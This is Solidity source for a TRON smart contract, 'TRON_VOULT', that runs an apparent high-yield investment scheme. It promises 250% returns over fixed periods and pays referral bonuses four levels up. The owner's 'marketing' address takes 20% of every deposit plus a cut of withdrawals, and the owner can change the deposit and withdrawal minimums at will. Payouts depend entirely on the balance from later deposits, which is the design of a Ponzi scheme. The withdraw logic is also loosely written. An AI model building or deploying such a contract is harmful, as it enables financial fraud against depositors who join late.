//SourceUnit: SafeMath.sol

pragma solidity ^0.5.15;

library SafeMath {

    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint a, uint b) internal pure returns (uint) {
        require(b > 0);
        uint c = a / b;

        return c;
    }

    function sub(uint a, uint b) internal pure returns (uint) {
        require(b <= a);
        uint c = a - b;

        return c;
    }

    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a);

        return c;
    }

}

//SourceUnit: TRON_VOULT.sol

pragma solidity >=0.5.15;

import "./SafeMath.sol";

contract TRON_VOULT {
  using SafeMath for uint;


  struct Deposit {
    uint tariff;
    uint amount;
    uint at;
  }

  struct Referer {
    address myReferer;
    uint nivel;
  }

  struct Investor {
    bool registered;
    bool recompensa;
    address sponsor;
    Referer[] referers;
    uint balanceRef;
    uint totalRef;
    Deposit[] deposits;
    uint invested;
    uint paidAt;
    uint withdrawn;
  }

  uint public MIN_DEPOSIT = 250 trx;
  uint public MIN_RETIRO = 200 trx;

  uint public RETIRO_DIARIO = 45000 trx;

  uint public paso = 500000 trx;

  address payable public marketing;
  address public NoValido;
  bool public Do;

  uint[4] public porcientos = [5, 3, 1, 1];

  uint[8] public tiempo = [ 83 days, 63 days, 50 days, 41 days, 36 days, 31 days, 28 days, 25 days];
  uint[8] public porcent = [ 250, 250, 250, 250, 250, 250, 250, 250];
  
  uint public tarifa = 0;

  uint public totalInvestors;
  uint public totalInvested;
  uint public totalRefRewards;


  mapping (address => Investor) public investors;

  constructor() public {
    marketing = msg.sender;
    investors[msg.sender].registered = true;
    investors[msg.sender].sponsor = marketing;

    totalInvestors++;

  }

  function setstate() public view  returns(uint Investors,uint Invested,uint RefRewards){
      return (totalInvestors, totalInvested, totalRefRewards);
  }

  function InContract() public view returns (uint){
    return address(this).balance;
  }

  function setTarifa() internal returns(uint){

      if(InContract() < paso){
          tarifa = 0;
      }

      if(InContract() >= paso && InContract() < 2*paso){
          tarifa = 1;
      }

      if(InContract() >= 2*paso && InContract() < 3*paso){
          tarifa = 2;
      }

      if(InContract() >= 3*paso && InContract() < 4*paso){
          tarifa = 3;
      }

      if(InContract() >= 4*paso && InContract() < 5*paso){
          tarifa = 4;
      }

      if(InContract() >= 5*paso && InContract() < 6*paso){
          tarifa = 5;
      }

      if(InContract() >= 6*paso && InContract() < 7*paso){
          tarifa = 6;
      }

      if(InContract() >= 7*paso && InContract() < 8*paso){
          tarifa = 7;
      }

      if(InContract() >= 8*paso ){
          tarifa = 8;
      }

      return tarifa;

  }

  function setMinDeposit(uint _MIN_DEPOSIT) public returns (uint){
    require (msg.sender == marketing, "You are not marketing");

    MIN_DEPOSIT = _MIN_DEPOSIT;

    return MIN_DEPOSIT;
  }

  function setMinRetiro(uint _MIN_RETIRO) public returns (uint){
    require (msg.sender == marketing, "You are not marketing");

    MIN_RETIRO = _MIN_RETIRO;

    return MIN_RETIRO;
  }

  function setPaso(uint _paso) public returns (uint){
    require (msg.sender == marketing, "You are not marketing");

    paso = _paso;

    return paso;
  }

  function setRetiroDiario(uint _RETIRO_DIARIO) public returns (uint){
    require (msg.sender == marketing, "You are not marketing");

    RETIRO_DIARIO = _RETIRO_DIARIO;

    return RETIRO_DIARIO;
  }

  function setmarketing(address payable _marketing) public returns (address){
    require (msg.sender == marketing, "You are not marketing");
    require (_marketing != marketing, "You are already registered");

    marketing = _marketing;
    investors[marketing].registered = true;
    investors[marketing].sponsor = marketing;

    totalInvestors++;

    return marketing;
  }


  function column (address yo) public view returns(address[4] memory res) {

    res[0] = investors[yo].sponsor;
    yo = investors[yo].sponsor;
    res[1] = investors[yo].sponsor;
    yo = investors[yo].sponsor;
    res[2] = investors[yo].sponsor;
    yo = investors[yo].sponsor;
    res[3] = investors[yo].sponsor;

    return res;
  }

  function rewardReferers(address yo, uint amount) internal {

    address[4] memory referi = column(yo);
    uint[4] memory a;
    uint[4] memory b;

    for (uint i = 0; i < 4; i++) {

      Investor storage usuario = investors[referi[i]];

      if (usuario.registered && referi[i] != marketing ) {

        if ( usuario.recompensa ){
          b[i] = porcientos[i];
          a[i] = amount.mul(b[i]).div(100);

          usuario.balanceRef += a[i];
          usuario.totalRef += a[i];
          totalRefRewards += a[i];
        }

      }else{

        b[i] = porcientos[i];
        a[i] = amount.mul(b[i]).div(100);

        usuario.balanceRef += a[i];
        usuario.totalRef += a[i];
        totalRefRewards += a[i];

        break;
      }
    }


  }


  function deposit(address _sponsor) external payable {
    require ( msg.value >= MIN_DEPOSIT, "Send more TRX");

    Investor storage usuario = investors[msg.sender];

    setTarifa();

    if (!usuario.registered){

      usuario.registered = true;
      usuario.sponsor = _sponsor;
    }

    if ( _sponsor == usuario.sponsor ){

      usuario.deposits.push(Deposit(tarifa, msg.value, block.timestamp));

      if (!usuario.recompensa){

        usuario.recompensa = true;
        totalInvestors++;

      }

      usuario.invested += msg.value;
      totalInvested += msg.value;

      marketing.transfer(msg.value.mul(20).div(100));

      rewardReferers(msg.sender, msg.value);

    }

  }


  function withdrawable(address any_user) public view returns (uint amount) {
    Investor storage investor = investors[any_user];

    for (uint i = 0; i < investor.deposits.length; i++) {
      Deposit storage dep = investor.deposits[i];
      uint tiempoD = tiempo[dep.tariff];
      uint porcientD = porcent[dep.tariff];

      uint finish = dep.at + tiempoD;
      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
      uint till = block.timestamp > finish ? finish : block.timestamp;

      if (since < till) {
        amount += dep.amount * (till - since) * porcientD / tiempoD / 100;
      }
    }
  }


  function MYwithdrawable() public view returns (uint amount) {
    Investor storage investor = investors[msg.sender];

    for (uint i = 0; i < investor.deposits.length; i++) {
      Deposit storage dep = investor.deposits[i];
      uint tiempoD = tiempo[dep.tariff];
      uint porcientD = porcent[dep.tariff];

      uint finish = dep.at + tiempoD;
      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
      uint till = block.timestamp > finish ? finish : block.timestamp;

      if (since < till) {
        amount += dep.amount * (till - since) * porcientD / tiempoD / 100;
      }
    }
  }

  function profit() internal returns (uint) {
    Investor storage investor = investors[msg.sender];

    uint amount = withdrawable(msg.sender);

    amount += investor.balanceRef;
    investor.balanceRef = 0;

    investor.paidAt = block.timestamp;

    return amount;

  }


  function withdraw() external {

    Investor storage usuario = investors[msg.sender];

    uint amount = withdrawable(msg.sender);
    amount = amount+usuario.balanceRef;

    require ( InContract() >= amount, "The contract has no balance");
    require ( amount >= MIN_RETIRO, "The minimum withdrawal limit reached");

    profit();

    uint amount10 = amount.mul(10).div(100);
    uint amount90 = amount.mul(90).div(100);

    if ( msg.sender.send(amount90) ) {

      usuario.withdrawn += amount90;
      usuario.invested += amount10;

      usuario.deposits.push(Deposit(tarifa, amount10, block.timestamp));

      totalInvested += amount10;

    }

    marketing.transfer( amount10.div(2) );

  }

  function reinvest() external {

    Investor storage usuario = investors[msg.sender];

    uint amount = withdrawable(msg.sender);
    amount = amount+usuario.balanceRef;

    profit();

    usuario.deposits.push(Deposit(tarifa, amount, block.timestamp));

    usuario.invested += amount;
    totalInvested += amount;

  }

  function () external payable {}

}